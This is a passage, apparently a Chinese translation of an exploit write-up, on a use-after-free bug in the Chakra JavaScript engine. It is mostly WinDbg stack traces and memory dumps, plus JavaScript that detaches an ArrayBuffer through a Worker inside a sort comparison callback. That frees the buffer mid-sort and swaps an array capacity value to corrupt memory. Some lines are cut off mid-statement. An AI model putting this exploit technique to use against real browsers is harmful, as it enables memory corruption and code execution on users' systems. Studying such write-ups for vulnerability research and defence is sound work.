    00 000000d0`f51fb3f8 00007ffc`3a932f11 KERNELBASE!VirtualAlloc
    01 000000d0`f51fb400 00007ffc`255fa5f5 EShims!NS_ACGLockdownTelemetry::APIHook_VirtualAlloc+0x51
    02 000000d0`f51fb450 00007ffc`255fdc4b chakra!Memory::VirtualAllocWrapper::Alloc+0x55
    03 000000d0`f51fb4b0 00007ffc`2565bc38 chakra!Memory::SegmentBase::Initialize+0xab
    04 000000d0`f51fb510 00007ffc`255fc8e2 chakra!Memory::PageAllocatorBase::AllocPageSegment+0x9c
    Allocated 0x10000 bytes @ address 000002d0909a0000
    000002d0`909a0000  00000000`00000000
    000002d0`909a0008  00000000`00000000
    000002d0`909a0010  00000000`00000000
    000002d0`909a0018  00000000`00000000
检查内存的内容后会显示一个数组的结构：
    0:025> dds 000002d0909a0000
    000002d0`909a0000  00000000
    000002d0`909a0004  00000000
    000002d0`909a0008  0000ffe0
    000002d0`909a000c  00000000
    000002d0`909a0010  00000000
    000002d0`909a0014  00000000
    000002d0`909a0018  0000ce7c
    000002d0`909a001c  00000000
    000002d0`909a0020  00000000     // 
= 0x38的数组元素替换缓冲区中偏移量为0x28处的整数数组备用容量），我们必须仔细地构造：
存储在ArrayBuffer中将要进行排序的值
这些值在ArrayBuffer中的位置
我们的JS比较函数返回的值（-1，0，1）[10]
做了一些测试后，我找到了下面的ArrayBuffer设置，这将触发我需要的精确交换操作：
    var ab = new ArrayBuffer(0x10000);
    var ia = new Int32Array(ab);
    [...]
    ia[0x0a] = 0x9;           // Array capacity, gets swapped (offset 0x28 of the buffer)
    ia[0x13] = 0x55555555;    // gets swapped (offset 0x4C of the buffer, element at index 5 of the int array)
    ia[0x20] = 0x66666666;
使用这种设置，当比较的元素是我要交换的两个值时，我的比较函数将触发UAF漏洞：
    [...]
    if ((this.a == 0x9) && (this.b == 0x55555555)){
        //Let's detach the 'ab' ArrayBuffer
        the_worker = new Worker('the_worker.js');
        the_worker.onmessage = function(evt) {
            console.log("worker.onmessage: " + evt.toString());
        }
        the_worker.postMessage(ab, [ab]);
        //Force the underlying raw buffer to be freed before returning!
        the_worker.terminate();
        the_worker = null;
        //Give some time for the raw buffer to be effectively freed
        var start = Date.now();
        while (Date.now() - start  0x55555555, so their positions must be swapped
        return 1;
    }
    [...]
我们可以通过在JavascriptArrayBuffer ::
FreeMemAlloc中设置断点来检查它是否按照我们预期的方式进行，其中VirtualFree即将被调用以释放ArrayBuffer的原始缓冲区：
    0:023> bp chakra!Js::JavascriptArrayBuffer::FreeMemAlloc+0x1a "r @$t0 = @rcx"
    0:023> g
    chakra!Js::JavascriptArrayBuffer::FreeMemAlloc+0x1a:
    00007fff`f8cc975a 48ff253f8d1100  jmp     qword ptr [chakra!_imp_VirtualFree (00007fff`f8de24a0)] ds:00007fff`f8de24a0={KERNELBASE!VirtualFree (00007ff8`11433e50)}
执行在断点处停止，所以现在我们可以检查ArrayBuffer的内容，该内容在排序后即将被释放：
    0:024> dds @rcx l21
    00000235`48070000  00000000
    00000235`48070004  00000000
    00000235`48070008  00000000
    00000235`4807000c  00000000
    00000235`48070010  00000000
    00000235`48070014  00000000
    00000235`48070018  00000000
    00000235`4807001c  00000000
    00000235`48070020  00000000
    00000235`48070024  00000000
    00000235`48070028  00000009         // the dword at this position will be swapped...
    00000235`4807002c  00000000
    00000235`48070030  00000000
    00000235`48070034  00000000
    00000235`48070038  00000000
    00000235`4807003c  00000000
    00000235`48070040  00000000
    00000235`48070044  00000000
    00000235`48070048  00000000
    00000235`4807004c  55555555         // ... with the dword at this position
    00000235`48070050  00000000
    00000235`48070054  00000000
    00000235`48070058  00000000
    00000235`4807005c  00000000
    00000235`48070060  00000000
    00000235`48070064  00000000
    00000235`48070068  00000000
    00000235`4807006c  00000000
    00000235`48070070  00000000
    00000235`48070074  00000000
    00000235`48070078  00000000
    00000235`4807007c  00000000